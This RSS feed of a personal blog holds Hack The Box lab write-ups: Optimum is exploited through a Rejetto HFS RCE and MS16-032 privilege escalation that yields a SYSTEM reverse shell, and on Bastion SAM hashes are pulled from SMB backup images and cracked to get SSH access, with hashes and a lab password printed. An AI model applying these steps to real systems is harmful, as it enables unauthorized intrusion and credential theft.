<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>dim1119&#39;s Blog</title>
    <link>/</link>
    <description>Recent content on dim1119&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 07 Apr 2021 22:18:38 +0300</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Optimum</title>
      <link>/hackthebox/optimum/</link>
      <pubDate>Wed, 07 Apr 2021 22:18:38 +0300</pubDate>
      
      <guid>/hackthebox/optimum/</guid>
      <description>Enumeration Lets start with nmap:
nmap -A 10.129.48.247 1 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 17:15 EST Nmap scan report for 10.129.48.247 Host is up (0.079s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.</description>
      <content>&lt;p&gt;&lt;img src=&#34;/htb/c5021f498be742e184c38de0d3857748.png&#34; alt=&#34;5db61c655fe06715d59df62dc577ebc5.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;Lets start with nmap:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -A 10.129.48.247                                                                         &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⨯
Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-05 17:15 EST
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.48.247
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.079s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;999&lt;/span&gt; filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 16.99 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Only port 80 is open.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/htb/c87ad1a688a64f87b994fa6bf45d4aa1.png&#34; alt=&#34;b524be7736e8e8b271d44ec03b76c636.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;exploiting-the-web-server&#34;&gt;Exploiting the web server&lt;/h1&gt;
&lt;p&gt;The website seems to be running Rejetto HttpFileServer 2.3, which is vulnerable to &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/&#34;&gt;RCE&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After setting the correct parameters we get a shell and the user flag.
&lt;img src=&#34;/htb/ce4c3ae7d004424b81b42717068ff35e.png&#34; alt=&#34;55a98f1176cb29adb1ac7a627e1fd4b0.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;privelege-escalation&#34;&gt;Privelege Escalation&lt;/h1&gt;
&lt;p&gt;Lets enumerate to achieve privilege escalation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;meterpreter &amp;gt; sysinfo 
Computer        : OPTIMUM
OS              : Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;2012&lt;/span&gt; R2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.3 Build 9600&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
Meterpreter     : x86/windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The architecture is x64 and the os is windows 2012 r2. Local exploit suggester works best at x86 architectures but lets try it. After putting session 1 in the background run
&lt;code&gt;multi/recon/local_exploit_suggester&lt;/code&gt; .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;windows/local/ms16_032_secondary_logon_handle_privesc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; use post/multi/recon/local_exploit_suggester 
msf6 post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/recon/local_exploit_suggester&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
msf6 post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/recon/local_exploit_suggester&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - Collecting local exploits &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x86/windows...
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; exploit checks are being tried...
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Post module execution completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The second module worked (&lt;code&gt;windows/local/ms16_032_secondary_logon_handle_privesc&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;windows/local/ms16_032_secondary_logon_handle_privesc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; exploit

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.129:4444 
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Compressed size: &lt;span style=&#34;color:#ae81ff&#34;&gt;1016&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Writing payload file, C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\k&lt;/span&gt;ostas&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;ppData&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;emp&lt;span style=&#34;color:#ae81ff&#34;&gt;\Z&lt;/span&gt;IcuZP.ps1...
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Compressing script contents...
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Compressed size: &lt;span style=&#34;color:#ae81ff&#34;&gt;3592&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Executing exploit script...
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;by b33f -&amp;gt; @FuzzySec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Operating system core count: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Duplicating CreateProcessWithLogonW handle
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Done, using thread handle: &lt;span style=&#34;color:#ae81ff&#34;&gt;1832&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sniffing out privileged impersonation token..

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Thread belongs to: svchost
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Thread suspended
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wiping current impersonation token
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Building SYSTEM impersonation token
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Success, open SYSTEM token handle: &lt;span style=&#34;color:#ae81ff&#34;&gt;2248&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Resuming thread..

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sniffing out SYSTEM shell..

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Duplicating SYSTEM token
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting token race
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting process race
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Holy handle leak Batman, we have a SYSTEM shell!!

MMHBHpbo933bF0v8HT8NeeJN2sTMQfEm
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Executed on target machine.
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sending stage &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;175174&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; to 10.129.48.247
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; opened &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.14.129:4444 -&amp;gt; 10.129.48.247:49164&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-05 17:36:56 -0500
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Deleted C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\k&lt;/span&gt;ostas&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;ppData&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;emp&lt;span style=&#34;color:#ae81ff&#34;&gt;\Z&lt;/span&gt;IcuZP.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally we get shell as root and the root flag:
&lt;img src=&#34;/htb/5e2538c20aa14a8e91a119346d6fe785.png&#34; alt=&#34;1a800bffcd5b68cfc2c6bd09b0756010.png&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Bastion</title>
      <link>/hackthebox/bastion/</link>
      <pubDate>Thu, 01 Apr 2021 17:04:59 +0300</pubDate>
      
      <guid>/hackthebox/bastion/</guid>
      <description>Enumeration Lets start with an nmap scan.
$ nmap -A 10.129.1.39 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 17:19 EST Nmap scan report for 10.129.1.39 Host is up (0.087s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -20m00s, deviation: 34m38s, median: -1s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.</description>
      <content>&lt;p&gt;&lt;img src=&#34;/htb/ac8361cac71a4a128cf542573603459d.png&#34; alt=&#34;356517204d7932f04b9ea22738940f89.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;Lets start with an nmap scan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ nmap -A  10.129.1.39                                                                           &lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt; ⨯
Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-01 17:19 EST
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.1.39
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.087s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;996&lt;/span&gt; closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard &lt;span style=&#34;color:#ae81ff&#34;&gt;14393&lt;/span&gt; microsoft-ds
Service Info: OSs: Windows, Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2008&lt;/span&gt; R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard &lt;span style=&#34;color:#ae81ff&#34;&gt;14393&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   Computer name: Bastion
|   NetBIOS computer name: BASTION&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   Workgroup: WORKGROUP&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|_  System time: 2021-03-01T23:19:45+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-01T22:19:49
|_  start_date: 2021-03-01T22:17:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 18.62 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;smb-share&#34;&gt;SMB Share&lt;/h4&gt;
&lt;p&gt;We notice that port 445 is open. The computer name is Bastion, the NetBIOS computer name is BASTION and the workgroup is WORKGROUP. Morover we get that the SMB account used is guest so lets try to enumerate that.&lt;/p&gt;
&lt;p&gt;I tried many tools though nmap&amp;rsquo;s &amp;ldquo;smb-enum-shares&amp;rdquo; worked.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;─$ nmap --script smb-enum-shares -p &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt; 10.129.1.39 
Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-01 17:24 EST
Stats: 0:00:21 elapsed; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; hosts completed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; undergoing Script Scan
NSE Timing: About 0.00% &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.1.39
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.077s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;10.129.1.39&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;DMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: &amp;lt;none&amp;gt;
|     Current user access: &amp;lt;none&amp;gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;10.129.1.39&lt;span style=&#34;color:#ae81ff&#34;&gt;\B&lt;/span&gt;ackups: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: &amp;lt;none&amp;gt;
|     Current user access: READ
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;10.129.1.39&lt;span style=&#34;color:#ae81ff&#34;&gt;\C&lt;/span&gt;$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: &amp;lt;none&amp;gt;
|     Current user access: &amp;lt;none&amp;gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;10.129.1.39&lt;span style=&#34;color:#ae81ff&#34;&gt;\I&lt;/span&gt;PC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: &amp;lt;none&amp;gt;
|_    Current user access: READ/WRITE

Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 36.72 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Many directories are revealed. Probably the most interesting the is ADMIN folder.
Logging into the &amp;ldquo;Backups&amp;rdquo; share using the command &lt;code&gt;smbclient //10.129.1.39/Backups -U &amp;quot;&amp;quot; &lt;/code&gt;.
&lt;img src=&#34;/htb/582c675f7454420e88fa719f5d52acda.png&#34; alt=&#34;ee51b40ad22bd93806c8c919ea77ea54.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lets download the note.txt file.
&lt;img src=&#34;/htb/87fd27d9c7ef40089ed13cc1e357649a.png&#34; alt=&#34;db5c1b278e288a3c1399f2b157056f7d.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The note contains the text:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Sysadmins: please don&#39;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;the-vhd-files&#34;&gt;The VHD files&lt;/h4&gt;
&lt;p&gt;After searching in the share we find some .vhd files.
&lt;img src=&#34;/htb/36b42bf37cae4f62b033ec40468ea882.png&#34; alt=&#34;7092fa11cc5bc47f1b9451d8d77b950d.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;I mounted the images using &lt;code&gt;sudo guestmount --add 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd1/ -m /dev/sda1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I didn&amp;rsquo;t find something noteable on the smaller vhd image. I tried to download the other one, but the file size was prohibitive. Lets use windows to directly access the files.&lt;/p&gt;
&lt;p&gt;We navigate to the smb folders (&lt;code&gt;\\10.129.1.39\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351&lt;/code&gt; in the windows explorer)
&lt;img src=&#34;/htb/b6cfce1d4eb445ba8518b2a940016910.png&#34; alt=&#34;150b97ab9d034803574d6bd0308582b4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now we search for hashes to crack. In windows hashes can be found at system32/config/SAM and in system32/config/SYSTEM. Lets try to obtain these files.
We succesfully get the files.
&lt;img src=&#34;/htb/d014ec54e37e431d8842d259e705509b.png&#34; alt=&#34;dfabc9d17cef56d94c1baeeafb9ced69.png&#34;&gt;
Now back in our linux box we need to extract and crack the hashes.&lt;/p&gt;
&lt;h1 id=&#34;cracking-the-hashes-found&#34;&gt;Cracking the hashes found&lt;/h1&gt;
&lt;p&gt;When we copy the files we can extract the hashes using samdump2.
&lt;img src=&#34;/htb/5a09babe0a3543fc9142c89b2a083274.png&#34; alt=&#34;1dd33335d2b6e9607d87d9ebccf17c2b.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The hashes are:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using john the ripper and rockyou we succesfully crack the hash
&lt;img src=&#34;/htb/197cd85e5d24490787e459f6d1b478b9.png&#34; alt=&#34;72ce6c796c019d59c465210a14e4d974.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;logging-in-to-l4mpje-via-ssh&#34;&gt;Logging in to L4mpje via SSH&lt;/h1&gt;
&lt;p&gt;Using the credentials found (&lt;code&gt;L4mpje&lt;/code&gt;:&lt;code&gt;bureaulampje&lt;/code&gt;) we succesfully login using SSH.
&lt;img src=&#34;/htb/ff5b6b8d34794a36a68e51f80d008cac.png&#34; alt=&#34;d32844ec307e5370dabcddf1fc1b21a8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the Desktop we find the user flag.
&lt;img src=&#34;/htb/3fa0d8f283c0437885621e1eef30ef77.png&#34; alt=&#34;7820c30aa335279f44ae312fc94604b2.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Lets enumerate our options to privesc.
